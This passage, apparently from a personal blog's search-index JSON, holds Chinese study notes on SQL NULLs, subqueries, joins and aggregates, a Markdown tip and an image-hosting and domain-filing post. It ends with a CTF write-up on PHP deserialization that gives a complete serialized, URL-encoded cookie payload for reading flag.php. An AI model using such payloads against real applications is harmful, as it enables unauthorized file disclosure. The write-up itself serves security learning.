因为空值是代表未知的值，所以并不是所有的空值都相等。例如student表中有两个学生的出生日期未知，但无法证明这两个学生的年龄相等。这样就不能用“=”运算符来检测空值。所以T-SQL引入了一个特殊的操作符IS来检侧特殊值之间的等价性。检测空值的使用语法如下： WHERE 表达式 IS NULL检测非空值的使用语法如下： WHERE 表达式 IS NOT NULL 处理空值 为了将空值转换为一个有效的值，以便于对数据理解，或者防止表达式出错。SQL Server专门提供了ISNULL函数将空值转换为有效的值，其使用语法格式如下： ISNULL(check_expr,repl_value）其中，check_expr是指被检查是否为NULL的表达式，可以是任何数据类型。repl_value是在check_expr为NULL时用其值替换NULL值，需与check_expr具有相同的类型。就像replace函数","path":"2020/04/02/SQL语句-空值及其处理/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--子查询","text":"子查询简单子查询 当一个查询是另一个查询的条件时，称之为子查询。子查询可以使用几个简单命令构造功能强大的复合命令。子查询可以嵌套。 嵌套查询的过程是：首先执行内部查询，它查询出来的数据并不被显示出来，而是传递给外层语句（亦称主查询），并作为外层语句的查询条件来使用。 相关子查询 在前面的例子中，子查询都仅执行一次，并将得到的值代入外部查询的WHERE子句中进行计算，这样的子查询称之为非相关子查询，非相关子查询是独立于外部查询的子查询。 而有些查询中，子查询依靠外部查询获得值，这意味着子查询是重复执行的，为外部查询可能选择的每一行均执行一次，这样的子查询称之为相关子查询（也称为重复子查询）。 就是说相关子查询不会像非相关得那样只查询一次,而是分组后每一行都会区查询一遍,有点像group by使每一行有一个聚合值,求每一…都满足….得时候就可以使用 复杂子查询 如果一个子查询返回的不止一个值，将其称之为复杂子查询。主要有如下3种常用的复杂子查询： 使用IN或NOT IN引入子查询。其基本格式为：WHERE 表达式 [NOT] IN (子查询)。 使用ANY或ALL。其基本格式为：WHERE 表达式 比较运算符 [ANY | 3. ALL] (子查询)。其中，ANY表示任意一个，ALL表示所有的。使用EXISTS引入存在测试。其基本格式为：WHERE [NOT] EXISTS (子查询)。 (1)in 和 not in 通过IN（或NOT IN）引入的子查询返回结果是一个集合，该集合可以为空或者含有多个值。子查询返回结果之后，外部查询将利用这些结果。就是说在子查询得到的结果集中查找或者不在子查询得到的结果集中进行查找 (2)any 和 all ANY或ALL通常与关系运算符连用，这时的子查询返回结果是一个集合，如&gt; ANY(子查询)表示大于该集合中任意一个值时为真，而&gt; ALL(子查询)表示大于该集合中所有值时为真。应该还是很好理解的 (3)exists EXISTS后紧跟一个SQL子查询，从而构成一个条件，当该子查询至少存在一个返回值时，这个条件为真，否则为假。NOT EXISTS与之相反，当该子查询至少存在一个返回值时，这个条件为假，否则为真。也很好理解 多层嵌套 子查询可以嵌套在外部SELECT、INSERT、UPDATE或DELETE语句的WHERE或HAVING子句内，或者其他子查询中。尽管根据可用内存和查询中其他表达式的复杂程度不同，嵌套限制也有所不同，但一般均可以嵌套到32层。这个是两层嵌套,查找考了最高分学生的姓名班级要先查找最高分,然后找到他的学号,再根据学号找到姓名班级 查询结果的并 T-SQL命令还提供了UNION子句，它可以将多个SELECT命令连接起来生成单个SQL无法做到的结果集合。这就是sql注入里面常用的union查询,他要求结果集的列数相同,这样才能够吧所有的结果合并到一起 数据来源是一个查询的结果 在查询语句中，FROM指定数据来源，它可以是一个或多个表。实际上，由FROM指定的数据来源也可以是一个SELECT查询的结果。用到了数据来源是一个嵌套结果,自连接,排序,聚合","path":"2020/04/02/SQL语句-子查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--连接查询","text":"1.简单连接查询 在一个查询中，当需要对两个或多个表连接时，可以指定连接列，在WHERE子句中给出连接条件，在FROM子句中指定要连接的表，其格式如下： SELECT 列名1，列名2，… FROM 表1，表2，… WHERE 连接条件 对于连接的多个表通常存在公共列，为了区别是哪个表中的列，在连接条件中通过表名前缀指定连接列。例如，“teacher.编号”表示teacher表的编号列，“student.学号”表示student表的学号列，由此来区别连接列所在的表。 (1)等值连接 所谓等值连接，是指表之间通过“等于”关系连接起来，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。 (2)非等值连接 所谓非等值连接，是指表之间的连接关系不是“等于”，而是其他关系。通过指定的非等值关系将两个表连接起来的，产生一个连接临时表，然后对该临时表进行处理后生成最终结果。就比如这个between and (3)自连接 在数据查询中有时需要将同一个表进行连接，这种连接称之为自连接，进行自连接就如同两个分开的表一样，可以把一个表的某行与同一表中的另一行连接起来。 这个自连接就是自己和自己连接比较,所以需要用到x,y来区分 复杂连接查询 在SELECT的FROM子句中指定连接条件，有助于将这些连接条件与WHERE子句中可能指定的其他搜索条件分开，其连接语法如下： FROM 第一个表名 连接类型 第二个表名 [ON (连接条件)]根据连接条件分为内连接、外连接和交叉连接等复杂连接查询类型举例: 其实就是取交集得意思 (2)外连接 外连接会返回FROM子句中提到的至少一个表或视图的所有行，只要这些行符合任何WHERE或HAVING搜索条件。外连接检索通过左外连接引用的左表的所有行，以及通过右外连接引用的右表的所有行,而全外连接中两个表的所有行都将返回。 LEFT OUTER JOIN或LEFT JOIN（左外连接） RIGHT OUTER JOIN或RIGHT JOIN（右外连接） FULL OUTER JOIN或FULL JOIN（全外连接） (3)左外连接 左外连接简称为左连接，其结果包括第一个表（“左”表，出现在JOIN子句的最左边）中的所有行，不包括右表中的不匹配行。举例:说白了就是1-5是内连接得结果,6是把左表不满足条件得也加进来(会显示null) (4)右外连接 右外连接简称为右连接，其结果中包括第二个表（“右”表，出现在JOIN子句的最右边）中的所有行，不包括左表中的不匹配行。 举例: (5)全外连接若要通过在连接结果中包括不匹配的行保留不匹配信息，可以使用全外连接。SQL Server提供全外连接运算符FULL OUTER JOIN，不管另一个表是否有匹配的值，此运算符都包括两个表中的所有行。 举例:这就是左右外连接得结合其实 (6)交叉连接在这类连接的结果集内，两个表中每两个可能成对的行占一行。交叉连接不使用WHERE子句。 在数学上，就是表的笛卡尔积。第一个表的行数乘以第二个表的行数等于笛卡尔积结果集的大小。笛卡儿积","path":"2020/04/02/SQL语句-连接查询/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"SQL语句--聚合函数","text":"功能 聚合函数实现数据统计等功能，用于对一组值进行计算并返回一个单一的值，除COUNT函数外，聚合函数忽略空值。聚合函数常与SELECT语句的GROUP BY子句一起使用。 #常用的聚合函数# 聚合参数得一般格式 其中，ALL表示对所有值进行聚合函数运算，它是默认值；DISTINCT指定每个唯一值都被考虑；expr指定进行聚合函数运算的表达式。 举例 作用范围 通常一个聚合函数的范围是满足WHERE子句指定的条件的所有记录。在加上GROUP BY子句后，SQL命令把查询结果按指定列分成集合组。当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。使用HAVING子句可以对这些组进一步加以控制。用这一子句定义这些组所必须满足的条件，以便将其包含在结果中。当WHERE子句、GROUP BY子句和HAVING子句同时出现在一个查询中时，SQL的执行顺序如下： 执行WHERE子句，从表中选取行。 由GROUP BY对选取的行进行分组。 执行聚合函数。 执行HAVING子句选取满足条件的分组。 聚合函数:AS 说一说这个as得作用,第一列得值是课程号,因为select 课程号,但是第二列是一个聚合函数,所以需要as来做一个别名再来说聚合函数max得作用,就像上面说的,聚合函数得范围由所有得变为每组得所有记录,也就是说它先去找3-105这一组里面得最高分,再去找3-245,以此类推,从而达到了寻找每一门课得最高分要求 group by子句 GROUP BY子句用来为结果集中的每一行产生聚合值。如果聚合函数没有使用GROUP BY子句，则只为SELECT语句报告一个聚合值。指定GROUP BY时，选择列表中任一非聚合表达式内的所有列都应包含在GROUP BY列表中，或者GROUP BY表达式必须与选择列表表达式完全匹配。 简单地说就是不使用group by就对整个结果集做聚合函数运算,用了就按组划分,做聚合函数运算 HAVING子句 在SELECT查询中，在给定分组GROUP BY子句后，可以通过HAVING子句中使用聚合函数来进行分组条件判断。就是说使用了group by需要用到聚合函数作为筛选条件,就得用having.并且,使用聚合函数返回得值应该是唯一得!!! select cnum,score as ‘及格以上’ from score group by cnum having min(score)&gt;=60我在自己得数据库中这样写尝试找出所有最低分大于60得学生得学号和所有分数.这样是错的!因为返回得学号都是单一得,但是所有大于60得科目肯定不止一课!不是唯一值!!只能这么改select cnum from score group by cnum having min(score)&gt;=60找出最低分&gt;60得学生得学号,肯定是单一的 总结要点当一个聚合函数和一个GROUP BY子句一起使用时，聚合函数的范围变成为每组的所有记录。换句话说，一个结果是由组成一组的每个记录集合产生的。并且,使用聚合函数返回得值应该是唯一得!!!对一组值进行计算并返回一个单一的值!!!","path":"2020/04/02/SQL语句-聚合函数/","date":"04-02","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"关于markdown2","text":"初步理解markdown就是一个编译器,在一次查阅时有了一个清晰得认识 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过类似HTML的标记语法，它可以使普通文本内容具有一定的格式。但是它本身是不支持修改字体、字号与颜色等功能的！ CSDN-markdown编辑器是其衍生版本，扩展了Markdown的功能（如表格、脚注、内嵌HTML等等）！ 所以说,其实markdown2是方便用于直接编写html页面得一个编辑器,是可以接受heml标签得,想要调整字体得颜色大小直接使用html标签即可 &lt;font color=&quot;&quot;&gt;&lt;/font&gt;","path":"2020/04/02/关于markdown2/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"使用七牛云来上传图片","text":"mpic使用学习:https://www.jianshu.com/p/7c537ccf18f9 一开始使用在github上建仓库然后使用git上传在获取链接,这样子上传图片真的是麻烦的不得了,在了解了mpic之后,,,,啊啊啊啊,真的方便,使用图片跟word里面差不错了,甚至还可以直接上传QQ截图和复制的图片自动上传…真是6666 只不过你需要打开这些功能 可惜七牛云上面的开辟的空间只有30天可用时间,得自己去注册一个才可以无限用下去.我自己去阿里云注册了个域名 选一个自己喜欢后缀,合适得价位买一个就好. 但是买完之后不去备案得花是不能够使用得,,还得先去备案.备案推荐这篇文章,写的很详细:https://blog.51cto.com/13373096/2339036中间自己碰到了几个坑总结一下:备案前提 网站备案前提准备：1、备案域名，准备需要备案的域名（域名可以不在阿里云），域名需要实名认证（个人域名就个人认证，企业域名就企业认证），域名备案主体要与实名认证信息相符合。 2、备案服务号，在阿里云备案需要备案服务号，购买阿里云大陆地域的ECS云服务器、虚拟主机、轻量应用服务器等就可以申请备案号，如何申请备案号参考：阿里云备案服务号申请方法及说明 3、备案材料，个人备案需要×××图片、《网站备案真实性核验单》（核验单在备案过程中即可下载，按照流程操作即可），由于当地管局备案规则不同，有可能还需要域名证书，域名证书需要去域名注册商网站上获取。企业备案需要营业执照、备案负责人和网站负责人×××件照片、《网站备案真实性核验单》，另外，由于当地管局备案规则不同，有可能需要其他证明材料，例如域名证书、法定代表人委托授权书等，按照要求准备材料即可。 备案域名就有坑,你实名注册之后,其实是还需要等待三天才是真正得注册完成工信部那边还没跟新你的消息,所以后面我备案死活进行不下去 备案服务号也是,需要你有服务器才可以去申请,但是我只买了个域名(其实如果是学生得花可以去买个学生机,不贵,9.5一个月)但是当时自己没想买,就百度到了一个公众号花9.9买了一个备案服务号然后选择使用备案服务号可以","path":"2020/04/02/使用七牛云来上传图片/","date":"04-02","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"zkaq--序列化与反序列化","text":"定义:序列化是将对象的状态信息转换为可以存储或传输的形式的过程 代码为： serialize ( mixed $value )反序列化则相反，代码为：unserialize ( string $str )如果只是这样，那么应该没有什么可以利用的漏洞。然而，serialize ( mixed $value )与unserialize ( string $str )这两个函数在使用时，会自动使用一些魔法函数，以及，如果在定义的类内存在魔法函数，也会自动调用 也就是说,序列化与反序列化必须要配合一些魔法函数才能发挥作用 反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。 函数介绍 变量 FILE这是用于返回当前访问得文件得目录的 show_source()函数###用于显示页面源代码的,括号中填路径,配合FILE使用就是显示当前页面的源代码 魔法函数__toString###__toString() 是魔术方法的一种，具体用途是当一个对象被当作字符串对待的时候，会触发这个魔术方法以下说明摘自PHP官方手册public string __toString ( void )__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。Warning不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 *输出字符串时是不会触发的,把类当字符串输出才会触发* ###其余常用的魔法函数### writeup题解 这是题目的源码,很明显是代码审计第一行可以得知flag在./flag.php中访问一下什么也没有,检查源代码也没有.这说明服务器端的php代码并没有输出值.需要用到show_resource才能看到flag 思路Highlight_file(,true)就是确认开启代码高亮引用了一个魔术方法toString,检测到把类当初字符串输出后就会会把readme.txt和$this-&gt;source拼接在一起输出.源码中赋值的是FILE__所以这个页面会输出源码,如果我们把source的赋值变成flag.php把岂不是也能输出flag了?而全文就只有一个输出类的地方似乎就是检测get传参的那边.他会把当前文件的路径名传给resource变量然后输出.但其实还有一个输出的点,那就是就相当于echo $tode 这里很明显是把数组todos遍历输出在cookie传参的时候会有用到todos,会把m反序列化之后传给todos,但是这时候的todos并不是数组,所以只要强行给m值加上一个中括号,这样todos就变成了一个数组变量S是已经无法修改了只能是赋值FILE,所以得在另外一个输出点下手.Cookie判断里,substr($a,32)和substr($a,0,32)前者是从$a第32位之后开始取值,后者是取值前32. &nbsp如果h=md5(m)就会给todos赋值,c是我们可以控制的,这说明c应该是由md5(m).m构成,这样就变成了md5(m)==md5(m),而m会被反序列化,说明c的后32位应该先序列化.只要把我们想要的flag.php序列化,然后给m,todos输出就会得到源码.但是todos必须是数组才会输出,所以得给readme对象再加一个[],然后再去序列化 这里的a指数组,i指第几个元素,0就是第零个这里的序列化是非常的关键的!!!必须使用readme类,source变量!!!这样反序列化之后就相当于给这个类的source复制成自己想要的了! 的时候就能输出源码了因为只有readme类里面才有这个__toString函数!这个函数也只输出source变量的源码!我们把序列化之后的字符串md5加密,得到e2d4f7dcc43ee1db7f69e76303d0105c把他们拼接在一起得到e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}},todos就能执行foreach,在cookie中被反序列化后就是一个有着信息的数组类,在foreach中输出.就会触发toString.这边有个小提示,cookie传参和get传参一样,是会先进行url编码的,所以得先编码再传参cookie,用burp抓包修改. e2d4f7dcc43ee1db7f69e76303d0105ca%3a1%3a%7bi%3a0%3bO%3a6%3a%22readme%22%3a1%3a%7bs%3a6%3a%22source%22%3bs%3a8%3a%22flag.php%22%3b%7d%7d 紧接着抓包修改页面,把cookie值改成上面一串,成功得到flag 总结cookie传过去之后的流程: if(isset($COOKIE[‘todos’]))接收到cookie里的todos传参,为真进入if判断 然后把todos值赋给了$c,$h接收了$c的前32位,$m接收了$c的从第33位到结束所有的 把$m md5加密后与$h比较发现是一样的,就将$m反序列化,此时得到的就是[$readme],它是一个数组,数组中是一个readme对象,source的值是flag.php 因为没有get,post传参所以直接往下执行,直接遍历输出todos,输出readme类之后就会触发__toString魔术方法,自动输出该方法里的source页面的代码,和readme.txt拼接在一起后输出 得到了flag","path":"2020/04/01/zkaq-序列化与反序列化/","date":"04-01","excerpt":"","tags":[{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}],"categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"},{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"},{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"},{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"},{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"},{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"},{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"},{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"},{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"},{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"},{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"},{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"},{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"},{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"},{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"},{"name":"SQL注入--Get注入","slug":"SQL注入-Get注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/"},{"name":"web前端安全基础","slug":"web前端安全基础","permalink":"http://wxnsoul.github.io/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"web通信原理","slug":"web通信原理","permalink":"http://wxnsoul.github.io/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"},{"name":"序列化与反序列化","slug":"序列化与反序列化","permalink":"http://wxnsoul.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}